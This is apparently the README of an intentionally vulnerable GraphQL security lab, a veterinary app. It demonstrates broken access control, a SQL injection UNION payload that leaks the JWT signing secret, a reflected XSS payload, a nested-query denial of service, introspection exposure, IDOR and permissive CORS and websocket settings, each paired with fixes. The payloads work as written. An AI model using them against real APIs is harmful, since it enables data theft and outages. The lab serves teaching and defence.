# Research on GraphQL

<!-- markdownlint-disable MD024 -->

## Objective

1. Study what is GraphQL.
2. Analyse the usage of GraphQL from an AppSec point of view (attacks and defenses).
3. Identify potential weaknesses on which attacks can be leveraged.

## Labs

A labs has been created in order to study the differents issues, this one take the context of a Veterinary managing healthcare of dogs.

The labs was developed using [IntelliJ IDEA Community Edition](https://www.jetbrains.com/idea/download/).

Domains used are the following:

```text
# Define in host file
127.0.0.1 localhost
127.0.0.1 domain1.local
127.0.0.1 domain2.local
```

There is the labs conditions and assumptions:

* A Veterinary can be associated with 0 or N dogs.
* A Dog can be associated with 0 or 1 Veterinary.
* A Veterinary possess a characteric named **Popularity** present into the storage system (database) but it must no be accessed by GraphQL client because it is a sensitive information.
* The GrapQL data consumption point of view is the Veterinary. Dog information are public.
* The lab is expliclty a vulnerable application in which several vulnerabilties has been implemented and are identified using the `[VULN]` marker in comments.
* Regarding the authentication, a fake 3rd party service has been implemented (via a servlet) and return a JWT token contaning the Veterinary name into the token.

Once started via the lauch configuration present into the project or the command line `mvn spring-boot:run`, the labs is available on these endpoints:

* [GraphiQL](http://localhost:8080/graphiql)
* [GraphQL](http://localhost:8080/graphql)

## Security weaknesses

### Authorization (broken access control)

[CWE-285](https://cwe.mitre.org/data/definitions/285.html)

#### Issue

As GraphQL is based on a single endpoint on which every requests is sent and as authorization is out of scope of the specification (no built-in features).

It's up to the application to implements an authorization logic.

In my labs I have a vulnerability on this point because the verification of the access token do not verify that the token belong to the veterinary passed in **veterinaryId"**

**Example:**

I ask a access token for **Dr Julien** that have the identifier **3** in the storage.

```bash
$ curl http://localhost:8080/auth?vet=Julien
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNTQ2NDQyOTAyfQ.H9A-vXRsiivFGShtdhiR3N2lSDDx-sNqbbJxMRNnExI
```

I send a GraphQL request to the query `myInfo(...)` using the obtained access token BUT I specify the identifier **2** that the one of **Dr Benoit**:

```javascript
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNTQ2NDQyOTAyfQ.H9A-vXRsiivFGShtdhiR3N2lSDDx-sNqbbJxMRNnExI", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

I receive in the GraphQL response the list of Dogs associated with **Dr Benoit**:

```javascript
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
    ...
```

#### Reco

With GraphQL we passed from a authorization matrix using `Role x Feature` to data level security using `Role x Data` because the also a single endpoints. User identity and roles must be passed to the top layer in charge grabbing the data (on act on) in order apply a verification using user identity prior to grab the data.

### Injection

[CWE-20](https://cwe.mitre.org/data/definitions/20.html) / [CWE-116](https://cwe.mitre.org/data/definitions/116.html)

#### Issue

According to how the information from the GraphQL request query/mutation/subscription are used by the GraphQL server to act on datastores there possbility for injection.

In my labs I have a vulnerability on this point about SQLi in query `dogs(namePrefix: String, limit: Int = 500): [Dog!]` because the parameter **namePrefix** is used in string concatenation to build a SQL query.

**Example:**

I send this GraphQL request in order to list the content of the `CONFIG` table

```javascript
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

I receive in the GraphQL response the secret used to sign JWT token along the name of the dog for which the name start **ab**:

```javascript
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

About XSS, it's interesting to note that the GraphQL response reflect the parameter sent in case of validation fail on the request sent.

**Example:**

I send this GraphQl request to the query `myInfo(accessToken: String!, veterinaryId: Int!): Veterinary`, i replace the Veterinary identifier (that is an integer) by a String XSS payload:

```javascript
query sqli {
  myInfo(accessToken: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNTQ2NDU1MDQwfQ.P87Ef-GM99a_vzzbUf2RprUYxFgxgPnSukaVnz22BJ0",
    veterinaryId: "<script>alert('XSS')</script>") {
    id
  }
}
```  

I receive this GraphQL response that reflect my payload, so, depending on the GraphQL client and is escaping/sanitizing behavior it can open the door to XSS:

```javascript
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('XSS')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 3,
          "column": 5,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('XSS')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "path": null,
      "extensions": null
    }
  ]
}
```

#### Reco

* Apply input validation on data received via Query/Mutation/Subscription prior to use it
* Ensure that the client rendering the data from GraphQL response apply escaping/sanitization on data prior to render them.

### Resource exhaustion

[CWE-400](https://cwe.mitre.org/data/definitions/400.html)

#### Issue

As the client control the amount of data requested it can send a GrapQL request to a query that cause a resource exhaustion on the storages called by the GraphQL server along the GraphQL server itself for the serialization of data to JSON.

This issue can also happen using a mutation by sending a large amount of data in the parameters (input validation can used here to prevent this attack).

This issue can also happen using a subscription by either:

* Register a large amount of subscribers and on each subscription exposed.
* Send a large amount of data in the parameters used by the subscriptions.

In my labs I have a vulnerability on this point for query, precisely in the query `allDogs(onlyFree: Boolean = false, limit: Int = 500): [Dog!]` that is available for anonymous user and retrieve the content of the DB about the Dog. As there a relation between Dogs and a Veterinary and the reverse then it's possible to perform cascading call causing resource exhaustion at SQL level on the DB.

**Example:**

When I send this request, I cause my CPU to go to 100% during several minutes and my DB is local because it's an SQLite

```javascript
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

![PROOF00](docs/PROOF00.png)

#### Reco

**For Query:**

Depending on the implementation of GraphQL server used, use the built-in protection provided for **Maximum Query Depth** & **Query Complexity** (see [specs here](https://www.howtographql.com/advanced/4-security/)).

For the Java implementation, add these 2 instrumentations classes to the execution strategy:

* [Protection against Query Complexity](https://github.com/graphql-java/graphql-java/blob/master/src/main/java/graphql/analysis/MaxQueryComplexityInstrumentation.java)
* [Protection against Query Deep](https://github.com/graphql-java/graphql-java/blob/master/src/main/java/graphql/analysis/MaxQueryDepthInstrumentation.java)

See this [class](src/main/java/eu/righettod/graphqlpoc/Application.java) for an example of usage of the 2 instrumentations above.

**For Mutation/Subscription:**

* Use input validation to limit the size of the incoming accepted data.
* Add subscribers limit at code level.

### Exposure of private data

[CWE-359](https://cwe.mitre.org/data/definitions/359.html)

#### Issue

With GrapQL, a [introspection feature](https://graphql.org/learn/introspection/) is offered to the client in order to access to the API schema in order to discover the available data, Query and Mutation and Subscription on them.

**Note:** Disabling *Introspection* puts your server in contravention of the GraphQL specification and expectations of most clients so use this with caution so prefer filtering access than disable it from business point of view.

It imply that any client is able to dig into the schema in order to see in `Type` if any interesting sensitive information are exposed (it's the same remark about action regarding the `Mutation` or `Subscription` exposed)

Using [GraphiQL](https://github.com/graphql/graphiql) via the **Documentation Explorer** panel or this [script](https://github.com/doyensec/graph-ql/) it's possible to browse the schema exposed from a GrapQL endpoint.

In my lab i have, by error, exposed the **popularity** information considered as sensitive about a Veterinary into the Type **Veterinary**

In my lab, this [url](http://localhost:8080/graphql/schema.json) allow to obtain a copy of the schema.

**Example:**

Using the **Documentation Explorer** panel, i have found this field:

![PROOF01](docs/PROOF01.png)

![PROOF02](docs/PROOF02.png)

![PROOF03](docs/PROOF03.png)

#### Reco

Authentication constraint can be set on the access to the GraphQL endpoint to prevent an exposure to anonymous user but any authenticated user will access this information schema.

Even if an client can see the structure of a type exposing sensiive information, to see this information it need to be allowed on the Query/Mutation/Subscription returning this data.

Do not map sensitive information into the type defined into the schema.

As GraphQL materialized how the client will consume the data, the GraphQL must not expose all the data available in the linked storage but ones useful for the client according to the business context of the GraphQL API exposed to them.

### Exposure of tehnical information in case of unexpected error

[CWE-200](https://cwe.mitre.org/data/definitions/200.html)

#### Issue

When the GraphQL server meet an unexpected error (I/O with storages, NullPointerException, Timeout...), the response indicate *Internal Server Error(s) while executing query* so it give an hint to the attacker have act on the system and cause an unexpected behavior.

**Example:**

When I send this request query on my lab (invalid token):

```javascript
query testErrorHandling {
  myInfo(accessToken:"aaaa", veterinaryId: 2){
    id, name, dogs {
      name,veterinary{
        name
      }
    }
  }
}
```

I receive this reponse that it inform me that i have acted on the system and caused an unexpected behavior. Perhaps, for example, i have generated a stack trace on app log and if the app log files are rotating on date (daily) and not on size then i can send multiple time this resquest to fill the disk with errors logs...

```javascript
{
  "data": {
    "myInfo": null
  },
  "errors": [
    {
      "message": "Internal Server Error(s) while executing query",
      "path": null,
      "extensions": null
    }
  ]
}
```

#### Reco

Return a generic error if an unexpected error is meet, like for example **Query cannot be processed!**

See an example into this [class](src/main/java/eu/righettod/graphqlpoc/security/ErrorHandler.java).

### Insecure Direct Object Reference (IDOR)

[CWE-639](https://cwe.mitre.org/data/definitions/639.html)

#### Issue

If the GrapQL API expose Query/Mutation/Subscription for which the data identifier is guessable/predictable then the Query/Mutation/Subscription are exposed to IDOR attack on which the attacker will use a custom built list of identifier in order to try to access or act on data having an identifier that is part of the list and the action will succeed if authorization issue are also present on the target Query/Mutation/Subscription handling the target data.

The GraphQL API Query/Mutation/Subscription proposed by my labs is vulnerable to IDOR because i use sequential integer for unique identifier for Dog and Veterinary.

**Example:**

Using the **Documentation Explorer** of GraphiQL we see that the identifier are simple integer and are sequential:

![PROOF04](docs/PROOF04.png)

![PROOF05](docs/PROOF05.png)

Request query to detect IDOR:

```javascript
query detectIDOR {
  allDogs{
    id,veterinary{
      id
    }
  }
}
```

The response show the sequential identifier for Dog and Veterinay:

```javascript
{
  "data": {
    "allDogs": [
      {
        "id": 1,
        "veterinary": {
          "id": 1
        }
      },
      {
        "id": 2,
        "veterinary": {
          "id": 1
        }
      },
      {
        "id": 3,
        "veterinary": {
          "id": 1
        }
      },
  ...
  {
        "id": 55,
        "veterinary": {
          "id": 2
        }
      },
      {
        "id": 56,
        "veterinary": {
          "id": 2
        }
      },
      {
        "id": 57,
        "veterinary": {
          "id": 2
        }
      },
      {
        "id": 58,
        "veterinary": {
          "id": 2
        }
      },
      {
        "id": 59,
        "veterinary": {
          "id": 2
        }
  ...
```

### Exposure of the API to the wrong sphere of clients

[CWE-668](https://cwe.mitre.org/data/definitions/668.html)

#### Issue

When using GraphQL implementation server to build your GraphQL API, it can happen that this one enable *by default* some features that expose the GraphQL API to the wrong sphere of clients.

##### Subscriptions WebSocket endpoint default enabling

In my lab it is the case because, by default, a WebSocket endpoint is exposed on the path `/subscriptions` and do not require any authentication (see this [doc](https://www.howtographql.com/basics/2-core-concepts/) precisely the section *Realtime Updates with Subscriptions*):

![PROOF08](docs/PROOF08.png)

Clients can obtain access to API data via this endpoint if the schema declare subscriptions in the `Subscription` section.

**Example:**

I can see the subscriptions exposed via the schema:

![PROOF09](docs/PROOF09.png)

If I send this subscription request to receive event from the *newAssociation* subscription:

```javascript
subscription subscribeToNewAssociation{
  newAssociation
}
```

I receive the following message indicating that, from now, i will receive information from this subscription:

```text
Your subscription data will appear here after server publication!
```

And when i create a association via this mutation request in another browser for example:

```javascript
mutation associateDog{
  	associateDogToMe(accessToken: "eyJ0eXAiOiJKV1Qi...", veterinaryId: 4, dogId: 198){
    name
  }
}
```

The mutation response prove that the action has been performed at data level:

```javascript
{
  "data": {
    "associateDogToMe": {
      "name": "Dobby"
    }
  }
}
```

After a moment, i receive this notification in response to my subscription:

```javascript
{
  "newAssociation": "Dog['Dobby'] associated with Veterinary['Maxime']."
}
```

![PROOF10](docs/PROOF10.png)

##### Cross-Origin Resource Sharing default enabling

In my lab it is the case because, by default, [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) is enabled and set to `*` so the API can be called by any `origin`.

**Example:**

When I send this request in which if specify a different `origin` from *domain1.local* to *domain2.local*:

```text
POST /graphql HTTP/1.1
Host: domain2.local:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: application/json
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
origin: http://domain1.local:8080
referer: http://domain1.local:8080
Content-Length: 104
DNT: 1
Connection: close
Pragma: no-cache
Cache-Control: no-cache

{"query":"query testCORS {\n  allDogs{\n    name\n  }\n}\n","variables":null,"operationName":"testCORS"}
```

I receive this response:

```text
HTTP/1.1 200 OK
Connection: close
Access-Control-Allow-Origin: *
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Type: application/json;charset=UTF-8
Content-Length: 3562
Date: Sat, 05 Jan 2019 16:23:47 GMT

{"data":{"allDogs":[{"name":"Abi"},...
```

Call from a browser:

![PROOF06](docs/PROOF06.png)

![PROOF07](docs/PROOF07.png)

#### Reco

Verify the features enabled by default and disable them if it impact the exposure of the API.

For the Subscriptions endpoint:

* If you expose subscription then ensure that there Authentication and Access Control in place on every subscription exposed in the schema.
* If you don't expose subscription then disable the WebSocket endpoint or block this endpoint at WAF/Application Server level.

In my lab it was to set the following options in this [configuration file](src/main/resources/application.properties):

* For CORS: `graphql.servlet.corsEnabled=false`
* For WebSocket: `graphql.servlet.websocket.enabled=false`

## References used

### GraphQL

* [GraphQL site](https://graphql.org/)
* [GraphQL tutorials](https://www.howtographql.com/)
* [DOYENSEC Blog about GraphQL issues](https://blog.doyensec.com/2018/05/17/graphql-security-overview.html)

### Labs

* [graphql-spring-boot](https://github.com/graphql-java-kickstart/graphql-spring-boot)
* [graphql-java-kickstart](https://www.graphql-java-kickstart.com)